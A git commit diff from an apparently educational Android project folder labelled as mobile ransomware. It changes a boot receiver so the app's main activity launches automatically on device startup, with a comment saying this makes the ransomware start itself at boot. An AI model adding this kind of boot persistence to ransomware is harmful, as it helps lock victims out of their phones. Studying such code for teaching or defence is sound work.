108fca26063ea4781008f153dbe89cf6dbaa473d
Wang-Jun-Chao <shining-glory@qq.com>
2015-10-10 11:47:32 +0800

    commit

--- 046-手机勒索软件/src/com/itheima/leisuo/BootReceiver.java
+++ 046-手机勒索软件/src/com/itheima/leisuo/BootReceiver.java
@@ -14,7 +14,12 @@ import android.widget.Toast;
 public class BootReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
-        System.out.println("开机成功");
-        Toast.makeText(context, "开机成功", Toast.LENGTH_SHORT).show();
+//        System.out.println("开机成功");
+//        Toast.makeText(context, "开机成功", Toast.LENGTH_SHORT).show();
+        // 启动Activity，实现开机自动启动勒索软件
+        Intent it = new Intent(context, MainActivity.class);
+        it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        context.startActivity(it);
+
     }
 }
